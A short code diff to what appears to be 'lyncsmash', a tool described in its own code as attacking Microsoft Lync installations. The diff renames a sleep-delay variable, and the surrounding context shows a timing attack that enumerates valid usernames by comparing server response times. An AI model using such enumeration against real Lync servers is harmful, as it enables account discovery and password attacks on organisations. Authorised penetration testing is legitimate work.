@@ -26,7 +26,7 @@ outputfile="lyncsmash.log"
 validCred = False
 isDisabled = False
 timeout = 1.00
-Sleep=0
+apSleep=0
 
 def main():
         parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
@@ -73,7 +73,7 @@ def main():
                        global outputfile
                        outputfile = args.outfile
                 if args.sleep is not None:
-                       Sleep=args.sleep
+                       apSleep=args.sleep
                 #okay, if we have a username file, proceed
                 if os.path.isfile(args.usernames):
                         # get a baseline timeout - this is response time for invalid usernames
@@ -168,7 +168,7 @@ def timing_attack(host,userfilepath,password,domain, randomize):
                 random.shuffle(user_list)
             for user in user_list:
                 try:
-                    time.sleep(Sleep)
+                    time.sleep(apSleep)
                     response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
                     candidatevalue=float(float(response_time)/timeout)
                     if candidatevalue <= float("0.4"):
